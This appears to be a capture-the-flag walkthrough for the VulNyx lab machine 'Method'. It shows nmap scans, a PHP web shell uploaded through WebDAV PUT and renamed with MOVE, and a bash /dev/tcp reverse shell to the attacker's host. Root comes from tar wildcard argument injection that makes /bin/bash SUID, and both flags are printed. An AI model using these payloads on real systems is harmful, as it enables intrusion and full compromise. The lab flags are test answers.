---
title: "Method"
date: 2026-10-31
platform: VulNyx
difficulty: easy
locked: false
tags: [linux, SUID, webdav, argument-injection]
---

## Reconnaissance

Let's check which are the open ports and if we are able to find anything interesting with `nmap`.

```bash
➜ sudo nmap -p- -sS -n -Pn --min-rate 5000 192.168.1.70 -oG content/allPorts
Starting Nmap 7.993 ( https://nmap.org ) at 2026-10-31 14:19 +0100
Nmap scan report for 192.168.1.70
Host is up (0.000046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:2A:DE:CD (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
```

```bash
➜ nmap -p22,80 -sVC -n -Pn 192.168.1.70 -oN content/targeted
Starting Nmap 7.993 ( https://nmap.org ) at 2026-10-31 14:20 +0100
Nmap scan report for 192.168.1.70
Host is up (0.00020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u7 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    lighttpd 1.4.59
|_http-title: Welcome page
|_http-server-header: lighttpd/1.4.59
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.37 seconds

```

Checking with Gobuster we are able to find a folder called `webdav`.

## Explotation

WebDav is  a service that allows us to upload, create, rename, delete files.
```bash
➜ curl -X OPTIONS http://192.168.1.70/webdav/ -v
*   Trying 192.168.1.70:80...
* Established connection to 192.168.1.70 (192.168.1.70 port 80) from 192.168.1.105 port 60720 
* using HTTP/1.x
> OPTIONS /webdav/ HTTP/1.1
> Host: 192.168.1.70
> User-Agent: curl/8.23.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< DAV: 1,2,3
< MS-Author-Via: DAV
< Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK, OPTIONS, GET, HEAD, POST
< Content-Length: 0
< Date: Sat, 31 Oct 2026 17:48:22 GMT
< Server: lighttpd/1.4.59
< 
* Connection #0 to host 192.168.1.70:80 left intact
```

So we will test with `davtest` what can we upload and if it requests authentication or not.
```bash
➜ davtest -url http://192.168.1.70/webdav                                                     
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://192.168.1.70/webdav
********************************************************
NOTE	Random string for this session: 7jjaLggx
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://192.168.1.70/webdav/DavTestDir_7jjaLggx
********************************************************
 Sending test files
PUT	jhtml	FAIL
PUT	aspx	FAIL
PUT	cgi	FAIL
PUT	jsp	FAIL
PUT	txt	FAIL
PUT	php	FAIL
PUT	shtml	FAIL
PUT	pl	FAIL
PUT	asp	FAIL
PUT	cfm	FAIL
PUT	html	SUCCEED:	http://192.168.1.70/webdav/DavTestDir_7jjaLggx/davtest_7jjaLggx.html
********************************************************
 Checking for test file execution
EXEC	html	FAIL

********************************************************
davtest.pl Summary:
Created: http://192.168.1.70/webdav/DavTestDir_7jjaLggx
PUT File: http://192.168.1.70/webdav/DavTestDir_7jjaLggx/davtest_7jjaLggx.html
```

As we can see we can upload `html` files but not `php` ones which makes us do more steps to gain access to this machine.

We will start creating our payload file.
```bash
➜ echo '<?php system($_GET["cmd"]) ?>' > exploits/index.html
```

Now upload it.
```bash
➜ curl -v -X PUT http://192.168.1.70/webdav/ --upload-file exploits/index.html
Note: Unnecessary use of -X or --request, PUT is already inferred.
*   Trying 192.168.1.70:80...
* Established connection to 192.168.1.70 (192.168.1.70 port 80) from 192.168.1.105 port 35790 
* using HTTP/1.x
> PUT /webdav/index.html HTTP/1.1
> Host: 192.168.1.70
> User-Agent: curl/8.23.0
> Accept: */*
> Content-Length: 188
> 
* upload completely sent off: 188 bytes
< HTTP/1.1 201 Created
< ETag: "3429162220"
< Content-Length: 0
< Date: Sat, 31 Oct 2026 17:42:49 GMT
< Server: lighttpd/1.4.59
< 
* Connection #0 to host 192.168.1.70:80 left intact
```

With the file uploaded as it is an `html` we cannot execute the code that we configured so we need to rename it and for that we will use the method `MOVE`.
```bash
➜ curl -v -X MOVE http://192.168.1.70/webdav/index.html -H "Destination: http://192.168.1.70/webdav/shell.php"
*   Trying 192.168.1.70:80...
* Established connection to 192.168.1.70 (192.168.1.70 port 80) from 192.168.1.105 port 56776 
* using HTTP/1.x
> MOVE /webdav/index.html HTTP/1.1
> Host: 192.168.1.70
> User-Agent: curl/8.23.0
> Accept: */*
> Destination: http://192.168.1.70/webdav/shell.php
> 
* Request completely sent off
< HTTP/1.1 201 Created
< Content-Length: 0
< Date: Sat, 31 Oct 2026 17:46:49 GMT
< Server: lighttpd/1.4.59
< 
* Connection #0 to host 192.168.1.70:80 left intact
```

To make it more clear we renamed the whole file to `shell.php` but now we just need to send the command via `GET`.
```bash
➜ curl 'http://192.168.1.70/webdav/shell.php?cmd=whoami'
www-data
```

Working as intended, now we can get the reverse shell.
## Privilege Escalation

### www-data

We will start getting a reverse shell.

*Shell 1*
```bash
➜ nc -lvnp 1234
Listening on 0.0.0.0 1234
```

*Shell 2*
```bash
➜ curl 'http://192.168.1.70/webdav/shell.php?cmd=%2Fbin%2Fbash+-c+%27bash+-i+%3E%26%2Fdev%2Ftcp%2F192.168.1.105%2F1234+0%3E%261%27'
```

*Shell 1*
```bash
➜ nc -lvnp 1234
Listening on 0.0.0.0 1234
Connection received on 192.168.1.70 47264
bash: cannot set terminal process group (437): Inappropriate ioctl for device
bash: no job control in this shell
www-data@method:~/html/webdav$ 
```

Let's sanitize it.
```bash
www-data@method:~/html/webdav$ which python
which python
/usr/bin/python
www-data@method:~/html/webdav$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@method:~/html/webdav$ export TERM=xterm
export TERM=xterm
www-data@method:~/html/webdav$ stty rows 183 cols 57
stty rows 183 cols 57
www-data@method:~/html/webdav$
```

Aparently there are no more users on this machine so we are able to get the `user.txt` flag.
```bash
www-data@method:~/html/webdav$ cat /etc/passwd | grep -E 'sh$'
'sh$'etc/passwd | grep -E '
root:x:0:0:root:/root:/bin/bash
www-data@method:~/html/webdav$ ls /home 
ls /home
www-data
```

```bash
www-data@method:~/html/webdav$ ls -lah /home
ls -lah /home
total 12K
drwxr-xr-x  3 root     root     4.0K Jul 11 10:36 .
drwxr-xr-x 17 root     root     4.0K Jul 10 19:33 ..
drwxr-xr-x  2 www-data www-data 4.0K Jul 11 10:36 www-data
www-data@method:~/html/webdav$ ls /home/www-data  
ls /home/www-data
user.txt
www-data@method:~/html/webdav$ cat /home/www-data/user.txt
ctat /home/www-data/user.txt
5492fc195e7dd4bf3ce4f413674156b6
```

### Root

After a while searching we did not find anything interesting so we will use `pspy`.

```bash
www-data@method:/home/www-data$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -q
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -q
www-data@method:/home/www-data$ chmod +x pspy64
chmod +x pspy64
www-data@method:/home/www-data$ ls -lah
ls -lah
total 3.0M
drwxr-xr-x 3 www-data www-data 4.0K Oct 31 19:35 .
drwxr-xr-x 3 root     root     4.0K Jul 11 10:36 ..
-rwxr-xr-x 1 www-data www-data 3.0M Jan 17  2023 pspy64
-r-------- 1 www-data www-data   33 Jul 11 10:36 user.txt
www-data@method:/home/www-data$ ./pspy64
./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
...
2026/10/31 19:37:01 CMD: UID=0     PID=2984   | /bin/sh -c cd /var/www/html/webdav/ && tar -zcf /var/backups/webdav.tgz * 
2026/10/31 19:37:01 CMD: UID=0     PID=2985   | tar -zcf /var/backups/webdav.tgz DavTestDir_7jjaLggx DavTestDir__EhCE9QT shell.php 
2026/10/31 19:37:01 CMD: UID=0     PID=2986   | /bin/sh -c gzip
```

With this we are able to see that `root` is creating backups of the page, the first command show us that this is vulnerable to **TAR Wildcard Argument Injection**. So if we create a file with `--` on the name, it will be interpreted as an argument of `tar` command and will be executed as it.

Let's exploit it.

First we configure our script that will add `SUID` to the shell to be able to execute it as root
```bash
www-data@method:~/html/webdav$ echo -e '#!/bin/bash\nchmod +s /bin/bash' > /var/www/html/webdav/root_shell.sh
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /var/www/html/webdav/root_shell.sh
www-data@method:~/html/webdav$ chmod +x /var/www/html/webdav/root_shell.sh
chmod +x /var/www/html/webdav/root_shell.sh
```

Now we will do the argument injection.

```bash
www-data@method:~/html/webdav$ touch "/var/www/html/webdav/--checkpoint-action=exec=sh root_shell.sh"
touch "/var/www/html/webdav/--checkpoint-action=exec=sh root_shell.sh"
www-data@method:~/html/webdav$ ls
ls
'--checkpoint-action=exec=sh root_shell.sh'   DavTestDir_7jjaLggx   DavTestDir__EhCE9QT   root_shell.sh   shell.php
```

This has several points:
- With `/var/www/html/webdav/` we are specifying which is the path of the file.
- With `--checkpoint-action=exec=sh root_shell.sh` we are setting the name of the file.
- The flag `--checkpoint-action` makes `tar` to execute the following action on each checkpoint.
- with `exec=sh root_shell.sh` we set the action which will be execute with a shell the script that we created before.

After all of this we have something clear, we need to generate a checkpoint to trigger our payload, so we will create another file with the name of an argument.
```bash
www-data@method:~/html/webdav$ touch "/var/www/html/webdav/--checkpoint=1"
touch "/var/www/html/webdav/--checkpoint=1"
www-data@method:~/html/webdav$ ls 
ls 
'--checkpoint-action=exec=sh root_shell.sh'  '--checkpoint=1'   DavTestDir_7jjaLggx   DavTestDir__EhCE9QT   root_shell.sh   shell.php
www-data@method:~/html/webdav$ 
```

Now let's check the result of everything.
```bash
www-data@method:~/html/webdav$ ls -lah /bin/bash
ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.2M Mar 27  2022 /bin/bash
www-data@method:~/html/webdav$ bash -p
bash -p
bash-5.1# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

As we can see `bash` got the `SUID` of `root` user and the EUID(Efective UID) is `root` if we execute the bash shell with privileged mode `-p`.

Now just get the `root.txt` flag.
```bash
bash-5.1# cat /root/root.txt
cat /root/root.txt
370ac5644039db096693f936c2bca98f
```
